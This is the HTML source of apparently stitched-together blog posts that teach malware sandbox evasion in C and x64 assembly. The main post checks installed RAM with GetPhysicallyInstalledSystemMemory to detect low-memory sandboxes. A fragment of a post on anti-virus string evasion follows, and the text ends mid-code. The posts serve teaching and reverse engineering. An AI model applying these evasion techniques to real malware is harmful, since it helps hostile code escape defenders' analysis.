&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.data&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_memory_size&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;Memory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;%lld&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xa&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.text&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Over the past two blog posts, we've learned how to use &lt;code&gt;GlobalMemoryStatusEx&lt;/code&gt; and &lt;code&gt;GetPhysicallyInstalledSystemMemory&lt;/code&gt; to determine the size of the RAM of a machine. We've also learned about using the stack to pass arguments to functions using x64 assembly.&lt;/p&gt;
&lt;p&gt;In future posts I plan to continue exploring malware behavior and techniques and at the same time teach x64 assembly so that we can both improve when writing and reverse engineering malware.&lt;/p&gt;
&lt;p&gt;Until then, you can view the C and Assembly code along with the build scripts for this evasion technique on this repository &lt;a href="https://github.com/accidentalrebel/sandbox-evasion-by-checking-ram-size"&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id="checking-the-memory"&gt;Checking the memory&lt;/h2&gt;
&lt;p&gt;The idea behind this evasion technique is simple. Most modern user machines will have at least around 4GB of RAM. Anything lower than that can be an indication that the machine is probably a sandbox (To save costs). While it's not exactly fool-proof, it can be used with &lt;a href="https://unprotect.it/category/sandbox-evasion/"&gt;other techniques&lt;/a&gt; to have a better idea of the machine.&lt;/p&gt;
&lt;p&gt;There are two available APIs to get the memory size of a computer on Windows: &lt;code&gt;GetPhysicallyInstalledSystemMemory&lt;/code&gt; and &lt;code&gt;GlobalMemoryStatusEx&lt;/code&gt;. &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getphysicallyinstalledsystemmemory"&gt;The former&lt;/a&gt; lists the physically &lt;em&gt;installed&lt;/em&gt; RAM from the BIOS, while &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-globalmemorystatusex"&gt;the latter&lt;/a&gt; lists the amount available for the operating system to use. Note that the values returned from these two functions will be different but from my tests the difference is only a few hundreds of bytes. Any of these two we can use for our purpose.&lt;/p&gt;
&lt;h2 id="using-getphysicallyinstalledsystemmemory"&gt;Using GetPhysicallyInstalledSystemMemory&lt;/h2&gt;
&lt;p&gt;Calling &lt;code&gt;GetPhysicallyInstalledSystemMemory&lt;/code&gt; in C is simple:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;memory_size&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;GetPhysicallyInstalledSystemMemory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;memory_size&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Memory size: %lld&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;memory_size&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Running the above code shows the following result:&lt;/p&gt;
&lt;p&gt;&lt;img alt="malware-sandbox-evasion-in-x64-assembly-by-checking-ram-size-part-1-01" src="https://www.accidentalrebel.com/images/malware-sandbox-evasion-in-x64-assembly-by-checking-ram-size-part-1-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;And this is what my memory settings is set to on VMWare:&lt;/p&gt;
&lt;p&gt;&lt;img alt="malware-sandbox-evasion-in-x64-assembly-by-checking-ram-size-part-1-02" src="https://www.accidentalrebel.com/images/malware-sandbox-evasion-in-x64-assembly-by-checking-ram-size-part-1-02.png" /&gt;&lt;/p&gt;
&lt;p&gt;You'll immediately notice that the returned value is not exactly the same as the memory settings. I, too, wondered about this so I did a couple of tests.&lt;/p&gt;
&lt;h2 id="investigating-the-results"&gt;Investigating the results&lt;/h2&gt;
&lt;p&gt;What I found was that the values that are returned by the &lt;code&gt;GetPhysicallyInstalledSystemMemory&lt;/code&gt; in hex format always have the last 3 bytes set to zero. To test this I changed the VM settings and noted the values returned by the program. Here's a table of the results:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style="text-align: center;"&gt;VM Settings&lt;/th&gt;
&lt;th style="text-align: center;"&gt;Returned Value&lt;/th&gt;
&lt;th style="text-align: center;"&gt;In Hex&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;2000MB&lt;/td&gt;
&lt;td style="text-align: center;"&gt;2048000&lt;/td&gt;
&lt;td style="text-align: center;"&gt;0x1F4000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;3324MB&lt;/td&gt;
&lt;td style="text-align: center;"&gt;3403776&lt;/td&gt;
&lt;td style="text-align: center;"&gt;0x33F000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;4096MB&lt;/td&gt;
&lt;td style="text-align: center;"&gt;4194304&lt;/td&gt;
&lt;td style="text-align: center;"&gt;0x400000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;4338MB&lt;/td&gt;
&lt;td style="text-align: center;"&gt;4493312&lt;/td&gt;
&lt;td style="text-align: center;"&gt;0x449000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;5675MB&lt;/td&gt;
&lt;td style="text-align: center;"&gt;5816320&lt;/td&gt;
&lt;td style="text-align: center;"&gt;0x58C000&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Before you think that this is a VM thing, here is the same behavior with a Windows system that is not on a VM:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style="text-align: center;"&gt;Installed RAM&lt;/th&gt;
&lt;th style="text-align: center;"&gt;Returned Value&lt;/th&gt;
&lt;th style="text-align: center;"&gt;In Hex&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;16384MB&lt;/td&gt;
&lt;td style="text-align: center;"&gt;16777216&lt;/td&gt;
&lt;td style="text-align: center;"&gt;0x1000000&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;According to the &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getphysicallyinstalledsystemmemory"&gt;MSDN docs&lt;/a&gt;, the value returned is taken from the SMBIOS firmware tables. I tried to dig further and found the &lt;a href="https://www.dmtf.org/sites/default/files/standards/documents/DSP0134_3.5.0.pdf"&gt;SMBIOS standard manual&lt;/a&gt; and saw that the value in the memory size field is returned in MB. This still doesn't explain why the last 3 digits are always zero though. I'm guessing that the API just truncates the last 3 values and saves the higher bytes?&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;EDIT(2022-08-15):&lt;/strong&gt; Twitter user &lt;a href="https://twitter.com/Endeavxor"&gt;@Endeavxor&lt;/a&gt; pointed out that the returned value of "GetPhysicallyInstalledSystemMemory" is expressed in kibibytes instead of kilobytes. This means the result &lt;code&gt;4194304&lt;/code&gt; when divided by &lt;code&gt;1024&lt;/code&gt; is &lt;code&gt;4096&lt;/code&gt; and is exactly the Memory value set in the VM settings. This means the value returned by the function is correct. It's so simple and I missed it!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Before we get hopelessly trapped in the rabbit hole that is OS internals, let's continue by converting our code above to x64 assembly.&lt;/p&gt;

&lt;p&gt;Before we can call the &lt;code&gt;GetPhysicallyInstalledSystemMemory&lt;/code&gt; function, we first need to reserve space on the stack that will serve as the &lt;code&gt;memory_size&lt;/code&gt; local variable. This is where the result of the function will be placed.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; Clear rax&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="c1"&gt;; Push rax to the stack&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;; Argument 1; Load the memory location of memory_size to rcx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then call the &lt;code&gt;GetPhysicallyInstalledSystemMemory&lt;/code&gt; function making sure that we reserve and release the shadow space.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="c1"&gt;; Reserve shadow space&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;GetPhysicallyInstalledSystemMemory&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="c1"&gt;; Release shadow space&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="aside-shadow-space"&gt;Aside: Shadow space&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The concept of "Shadow Space" is important in x64 assembly. I've already discussed it briefly in a &lt;a href="https://www.accidentalrebel.com/converting-a-malware-dropper-to-x64-assembly.html"&gt;previous post&lt;/a&gt; but you can read up more about it &lt;a href="https://retroscience.net/x64-assembly.html"&gt;here&lt;/a&gt; and then &lt;a href="https://devblogs.microsoft.com/oldnewthing/20160623-00/?p=93735"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The result on whether &lt;code&gt;GetPhysicallyInstalledSystemMemory&lt;/code&gt; succeeded or not is placed in the &lt;code&gt;ax&lt;/code&gt; register. It's good practice to add code to handle if a failure occurs, but we won't be bothering with that for our example.&lt;/p&gt;
&lt;p&gt;What we are interested in is the value placed in the memory location pointed to by &lt;code&gt;memory_size&lt;/code&gt;. We can confirm this by checking the value on the stack, as shown below where &lt;code&gt;58C000h&lt;/code&gt; converts to &lt;code&gt;5816320&lt;/code&gt; which is roughly near the &lt;code&gt;5.5 GB&lt;/code&gt; setting we have set in VMWare.&lt;/p&gt;
&lt;p&gt;&lt;img alt="malware-sandbox-evasion-in-x64-assembly-by-checking-ram-size-part-1-04" src="https://www.accidentalrebel.com/images/malware-sandbox-evasion-in-x64-assembly-by-checking-ram-size-part-1-04.png" /&gt;&lt;/p&gt;
&lt;p&gt;A much easier way to confirm is that we can also use the &lt;code&gt;printf&lt;/code&gt; function to display the value of &lt;code&gt;memory_size&lt;/code&gt; on the console. But before we can do that we first need to declare the &lt;code&gt;format&lt;/code&gt; string so we can pass it later as the first argument.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.data&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_memory_size&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;Memory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;%lld&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xa&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then call &lt;code&gt;printf&lt;/code&gt; making sure we load the correct argument data to the respective registers.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="c1"&gt;; Argument 2; Result of GetPhysicallyInstalledSystemMemory&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;msg_memory_size&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;; Argument 1; Format string&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="c1"&gt;; Reserve shadow space&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;printf&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="c1"&gt;; Release shadow space&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Running that we can now display the value of the memory.&lt;/p&gt;
&lt;p&gt;Here's the full assembly code:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;bits&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;default&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rel&lt;/span&gt;

&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.data&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_memory_size&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;Memory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;%lld&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xa&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.text&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;global&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;main&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;ExitProcess&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;GetPhysicallyInstalledSystemMemory&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;printf&lt;/span&gt;

&lt;span class="nl"&gt;main:&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;rbp&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; Clear rax&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="c1"&gt;; Push RAX to the stack&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="c1"&gt;; Reserve shadow space&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;GetPhysicallyInstalledSystemMemory&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="c1"&gt;; Release shadow space&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;; Argument 2; Result of GetPhysicallyInstalledSystemMemory&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;printf&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="c1"&gt;; Release shadow space&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x8&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; Release the space of memory_size local variable&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;ExitProcess&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="up-next"&gt;Up next&lt;/h2&gt;
&lt;p&gt;In the next blog post I'll be showing how to get the size RAM size via an alternative method using &lt;code&gt;GlobalMemoryStatusEx&lt;/code&gt;. The code is also straightforward but we'll be exploring how it's values differ from &lt;code&gt;GetPhysicallyInstalledSystemMemory&lt;/code&gt; and also how to deal with C structures on the stack in x64 assembly.&lt;/p&gt;
&lt;p&gt;For now, you can view the C and Assembly code along with the build scripts on the repository &lt;a href="https://github.com/accidentalrebel/sandbox-evasion-by-checking-ram-size"&gt;here&lt;/a&gt;.&lt;/p&gt;

The solution was simple and it worked. However, it was incomplete as strings of function calls and loaded DLLs were still detectable in memory.&lt;/p&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-2-01" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-2-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;In this post I'll be talking about the other technique from the same &lt;a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/"&gt;blog post&lt;/a&gt; we were following before. It does a good job of explaining the concept which I'll be covering here too. I will also be writing the code in assembly as an added bonus, so we can better understand what goes on under the hood.&lt;/p&gt;
&lt;h2 id="the-problem"&gt;The problem&lt;/h2&gt;
&lt;p&gt;Let's revisit our code from the last time. We have two functions being called &lt;code&gt;ShellExecuteA&lt;/code&gt; and &lt;code&gt;ExitProcess&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;shellapi.h&amp;gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
